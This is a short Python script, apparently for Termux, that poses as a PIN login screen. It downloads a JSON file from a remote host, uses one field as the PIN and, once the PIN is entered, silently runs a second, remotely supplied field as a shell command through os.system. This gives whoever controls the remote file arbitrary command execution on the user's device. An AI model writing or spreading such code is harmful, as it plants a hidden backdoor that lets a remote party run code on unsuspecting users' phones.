import os
import requests
os.system("clear")
print("Loading...")
URL = "https://cdn.vinz.my.id/key.json"
r = requests.get(url = URL) 
data = r.json() 
key = data['key']
ncmd = data['command']
os.system("clear")
lock = "true"
os.system("clear")
print("Termux Login !\n\n")
while lock == "true":
    password = input("Input PIN :")
    if password == key:
      lock = "false"
    os.system("clear")
    print("Termux Login !\n\n")
    print("Incorrect Password, Try Again...")
os.system(ncmd)
    
